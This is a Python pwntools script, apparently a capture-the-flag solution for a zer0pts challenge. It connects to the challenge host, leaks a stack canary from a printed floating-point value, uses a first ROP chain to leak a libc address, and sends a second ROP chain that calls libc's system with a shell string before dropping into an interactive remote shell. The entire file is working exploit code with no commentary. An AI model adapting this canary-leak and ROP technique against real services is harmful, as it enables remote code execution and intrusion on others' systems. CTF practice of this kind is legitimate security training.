from pwn import *

HOST, PORT = '0.0.0.0', 31338
HOST, PORT = 'pwn.ctf.zer0pts.com', 9002
r = remote(HOST, PORT)

r.sendline("""
1
16
a

""")
r.recvuntil('close to ')
data = r.recvuntil(' seconds', drop=True)
data = float(data)
canary = struct.pack("<d", data)
context.arch = 'amd64'
rop = flat({0x28: [
    0x400e93,  # pop rdi
    0x601ff0,
    0x4006d0,
    0x40089b
], 0x18: canary})

print(hexdump(canary))
r.sendline(rop)
r.recvuntil('(Y/n) ')
libc = u64(r.recvuntil('\nPlay', drop=True).ljust(8, b'\x00')) - 0x21b10
print(hex(libc))
rop = flat({0x28: [
  0x400e94, # ret
  0x400e93, # pop rdi
  libc + 0x1b3e1a,
  libc + 0x4f550
], 0x18: canary})
r.sendline(rop)
r.interactive()
